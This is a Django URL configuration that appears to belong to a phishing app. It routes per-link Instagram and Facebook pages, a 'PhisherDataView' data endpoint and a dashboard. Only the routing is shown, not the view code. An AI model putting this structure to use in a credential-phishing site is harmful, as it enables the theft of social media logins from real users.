from django.urls import path, include
from .views import HomeView, InstagramView, PhisherDataView, DashboardView, FacebookView

urlpatterns = [
    path('', HomeView.as_view()),
    path('instagram/<str:magic_code>/', InstagramView.as_view()),
    path('facebook/<str:magic_code>/', FacebookView.as_view()),
    path('data/', PhisherDataView.as_view()),
    path('dashboard/', DashboardView.as_view()),
]
